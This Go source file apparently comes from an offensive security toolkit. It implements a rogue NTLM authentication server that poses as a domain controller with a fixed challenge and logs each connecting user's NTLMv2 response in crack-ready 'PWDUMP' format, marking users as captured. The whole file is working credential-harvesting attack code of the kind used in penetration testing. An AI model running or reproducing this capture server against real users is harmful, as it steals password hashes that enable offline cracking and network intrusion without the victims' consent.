package ntlm

import (
	"fmt"
	"net/http"

	"github.com/hophouse/gop/utils/logger"
)

var DefaultNTLMAuthMiddleWare NTLMAuth
var NtlmCapturedAuth map[string]bool

func init() {
	DefaultNTLMAuthMiddleWare = NewNTLMAuthMiddleWare()
	NtlmCapturedAuth = make(map[string]bool)
}

type NTLMAuth struct {
	DomainName             string
	Challenge              string
	ServerName             string
	DnsDomainName          string
	DnsServerName          string
	PreliminaryChecksFunc  func(http.ResponseWriter, *http.Request) error
	DispatchFunc           func(NTLMAuth, http.ResponseWriter, *http.Request) (*NTLMSSP_AUTH, *NTLMv2Response, error)
	ServerNegociateFunc    func(http.ResponseWriter, *http.Request) error
	ServerChallengeFunc    func(http.ResponseWriter, *http.Request, string, string) error
	ServerAuthenticateFunc func(http.ResponseWriter, *http.Request) (NTLMSSP_AUTH, NTLMv2Response, error)
}

type NTLMAuthMiddlewareMux struct {
	NTLMHandler NTLMAuth
}

func NewNTLMAuthMiddleWare() NTLMAuth {
	return NTLMAuth{
		Challenge:              "00000000",
		DomainName:             "smbdomain",
		ServerName:             "DC",
		DnsDomainName:          "smbdomain.local",
		DnsServerName:          "dc.smbdomain.local",
		PreliminaryChecksFunc:  NTLMPreliminaryChecks,
		DispatchFunc:           NTLMDispatch,
		ServerNegociateFunc:    ServerNegociate,
		ServerChallengeFunc:    ServerChallege,
		ServerAuthenticateFunc: ServerAuthenticate,
	}
}

func (n NTLMAuth) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Get the response header.
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	err := n.PreliminaryChecksFunc(w, r)
	if err != nil {
		logger.Print(err)
		return
	}

	msg3, ntlmv2Response, err := n.DispatchFunc(n, w, r)
	if err != nil {
		logger.Print(err)
		return
	}

	if msg3 != nil && ntlmv2Response != nil {
		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(DefaultChallenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])

		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.RawData), string(msg3.Username.RawData))
		if _, found := NtlmCapturedAuth[authInformations]; !found {
			NtlmCapturedAuth[authInformations] = true
			logger.Printf("\n[+] PWDUMP:\n%s\n", ntlmv2_pwdump)
		} else {
			logger.Printf("\n[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
		}
	}
}

func (n NTLMAuthMiddlewareMux) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	n.NTLMHandler.ServeHTTP(w, r)
	next(w, r)
}
